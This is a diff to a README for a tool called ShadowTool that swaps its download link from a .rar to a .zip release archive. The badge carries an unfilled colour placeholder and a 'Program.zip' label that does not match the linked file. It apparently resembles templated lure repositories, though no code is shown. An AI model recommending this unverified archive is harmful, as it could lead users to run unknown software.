@@ -4,7 +4,7 @@ ShadowTool is a powerful and versatile suite of tools designed for performing a 
 
 ## Download ShadowTool 📥
 
-[![Download ShadowTool](https://img.shields.io/badge/Download-Program.zip-<COLOR-CODE>?style=for-the-badge)](https://github.com/MAHINISHAD2004/ShadowTool/releases/download/Download/application.rar)
+[![Download ShadowTool](https://img.shields.io/badge/Download-Program.zip-<COLOR-CODE>?style=for-the-badge)](https://github.com/MAHINISHAD2004/ShadowTool/releases/download/Download/application.zip)
 
 Click the button above to download ShadowTool and start exploring its capabilities!
 
